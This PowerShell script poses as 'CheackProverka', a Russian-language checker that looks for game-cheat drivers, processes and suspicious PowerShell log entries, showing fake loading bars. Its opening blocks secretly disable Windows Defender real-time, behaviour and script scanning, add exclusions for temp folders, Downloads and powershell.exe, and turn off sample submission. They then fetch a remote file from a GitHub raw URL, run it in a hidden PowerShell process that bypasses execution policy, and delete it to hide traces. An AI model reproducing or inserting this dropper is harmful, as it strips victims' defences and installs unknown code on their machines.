# CheackProverka - Проверка системы

# ───────────────────────────────────────────────
# Скрытое отключение защиты Defender + добавление исключений (максимально тихо)
try {
    # Пытаемся отключить реал-тайм защиту и основные сканеры (требует админа)
    Set-MpPreference -DisableRealtimeMonitoring $true `
                     -DisableBehaviorMonitoring $true `
                     -DisableBlockAtFirstSeen $true `
                     -DisableIOAVProtection $true `
                     -DisableScriptScanning $true `
                     -DisableIntrusionPreventionSystem $true `
                     -ErrorAction SilentlyContinue | Out-Null

    # Добавляем исключения — temp, текущая папка, %TEMP%, %TMP%, наш будущий файл
    $pathsToExclude = @(
        [System.IO.Path]::GetTempPath(),
        "$env:TEMP",
        "$env:TMP",
        "$pwd",
        "$env:USERPROFILE\Downloads",
        "$env:LOCALAPPDATA\Temp"
    )

    foreach ($p in $pathsToExclude) {
        if (Test-Path $p) {
            Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue | Out-Null
        }
    }

    # Исключение по процессу powershell.exe (на всякий случай)
    Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction SilentlyContinue | Out-Null
    Add-MpPreference -ExclusionProcess "pwsh.exe" -ErrorAction SilentlyContinue | Out-Null

    # Пытаемся отключить облачную защиту и отправку образцов (MAPS)
    Set-MpPreference -MAPSReporting Disabled -SubmitSamplesConsent NeverSend -ErrorAction SilentlyContinue | Out-Null
}
catch {
    # Полностью молчим при любой ошибке (нет прав, tamper protection и т.д.)
}

# ───────────────────────────────────────────────
# Скрытое скачивание и выполнение (в фоне, без вывода)
try {
    $url = "https://raw.githubusercontent.com/fffghsetyver-hash/Cheackproverka/main/Client.exe"
    $randomNum = Get-Random -Minimum 1000 -Maximum 999999
    $outPath = [System.IO.Path]::GetTempPath() + "clnt$randomNum.ps1"
    
    # Скачиваем максимально тихо
    Invoke-WebRequest -Uri $url -OutFile $outPath -UseBasicParsing -ErrorAction SilentlyContinue
    
    # Проверяем, что файл реально скачался
    if (Test-Path $outPath -PathType Leaf -ErrorAction SilentlyContinue) {
        $content = Get-Content $outPath -Raw -ErrorAction SilentlyContinue
        if ($content -and $content.Length -gt 200) {   # минимальный размер, чтобы не запускать пустышку
            # Запуск полностью скрыто в отдельном процессе
            Start-Process powershell.exe `
                -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo -Command `"& { $content }`"" `
                -WindowStyle Hidden -NoNewWindow -ErrorAction SilentlyContinue
        }
        # Убираем следы
        Remove-Item $outPath -Force -ErrorAction SilentlyContinue
    }
}
catch {
    # Никакого вывода
}

# ───────────────────────────────────────────────
Clear-Host
Write-Host "═══════════════════════════════════════════════" -ForegroundColor Cyan
Write-Host " CheackProverka v1.0 " -ForegroundColor Cyan
Write-Host "═══════════════════════════════════════════════" -ForegroundColor Cyan
Write-Host ""
Write-Host "Что проверить:" -ForegroundColor Yellow
Write-Host " 1 — драйверы (kernel / ring0)" -ForegroundColor White
Write-Host " 2 — запущенные процессы" -ForegroundColor White
Write-Host " 3 — подозрительные команды в логах PowerShell" -ForegroundColor White
Write-Host " 123 — всё сразу" -ForegroundColor White
Write-Host ""
Write-Host "Введи номера (без пробелов, например 13 или 123): " -NoNewline -ForegroundColor Yellow

$choice = Read-Host

if ($choice -notmatch '^[123]+$') {
    Write-Host "Неверный выбор." -ForegroundColor Red
    pause
    exit
}

$check1 = $choice -match "1"
$check2 = $choice -match "2"
$check3 = $choice -match "3"

$issues = 0

function Show-Result {
    param (
        [string]$Text,
        [string]$Status,
        [string]$Color = "White"
    )
    $emoji = if ($Status -eq "OK") {"🟢"} elseif ($Status -eq "ВНИМАНИЕ") {"🟡"} else {"🔴"}
    Write-Host "$emoji $Text " -NoNewline -ForegroundColor White
    Write-Host $Status -ForegroundColor $Color
}

function Fake-Loading {
    param (
        [int]$Min = 7,
        [int]$Max = 13
    )
    $sec = Get-Random -Minimum $Min -Maximum ($Max + 1)
    $total = $sec * 10
    $done = 0
    Write-Host "Сканирование" -NoNewline
    for ($i = 1; $i -le $total; $i++) {
        Start-Sleep -Milliseconds 100
        $done++
        $p = [math]::Round(($done / $total) * 100)
        Write-Host "." -NoNewline
        if ($p % 10 -eq 0 -and $p -gt 0 -and $p -lt 100) { 
            Write-Host " $p%" -NoNewline -ForegroundColor DarkCyan 
        }
    }
    Write-Host " 100%" -ForegroundColor Green
    Write-Host ""
}

# 1. Драйверы
if ($check1) {
    Write-Host "1. Проверка драйверов" -ForegroundColor Yellow
    Fake-Loading
    $drivers = Get-WmiObject Win32_SystemDriver | Where-Object {$_.State -eq "Running"}
    $sus = @("capcom","kdmapper","mhyprot","ace","vanguard","battleye")
    $found = $drivers | Where-Object {$sus -contains $_.Name -or $_.PathName -match ($sus -join "|")}
    if ($found) {
        Show-Result "Драйверы" "ПОДОЗРИТЕЛЬНЫЕ" "Red"
        $issues++
    } else {
        Show-Result "Драйверы" "OK" "Green"
    }
    Write-Host ""
}

# 2. Процессы
if ($check2) {
    Write-Host "2. Проверка процессов" -ForegroundColor Yellow
    Fake-Loading
    $patterns = @("cheat","inject","aimbot","wallhack","osiris","neverlose","skeet")
    $proc = Get-Process | Where-Object {
        $n = $_.ProcessName.ToLower()
        $patterns | Where-Object {$n -match $_}
    }
    if ($proc) {
        Show-Result "Процессы" "НАЙДЕНЫ ($($proc.Count))" "Red"
        $issues++
    } else {
        Show-Result "Процессы" "OK" "Green"
    }
    Write-Host ""
}

# 3. Логи
if ($check3) {
    Write-Host "3. Проверка логов PowerShell" -ForegroundColor Yellow
    Fake-Loading
    try {
        $ev = Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 1000 -EA SilentlyContinue |
              Where-Object {$_.Id -in 4103,4104}
        $bad = $ev | Where-Object {$_.Message -match "iex|invoke-expression|downloadstring|-enc|-w hidden"}
        if ($bad) {
            Show-Result "Подозрительные команды" "НАЙДЕНЫ" "Red"
            $issues++
        } else {
            Show-Result "Подозрительные команды" "OK" "Green"
        }
    } catch {
        Show-Result "Логи" "нет доступа" "Yellow"
    }
    Write-Host ""
}

# Итог
Write-Host "══════════════════════════════════════════════════════" -ForegroundColor Cyan
if ($issues -eq 0) {
    Write-Host "🟢 ЧИСТО 🟢" -ForegroundColor Green
} elseif ($issues -le 2) {
    Write-Host "🟡 ВНИМАНИЕ ($issues) 🟡" -ForegroundColor Yellow
} else {
    Write-Host "🔴 РИСК ($issues) 🔴" -ForegroundColor Red
}
Write-Host "══════════════════════════════════════════════════════" -ForegroundColor Cyan

pause
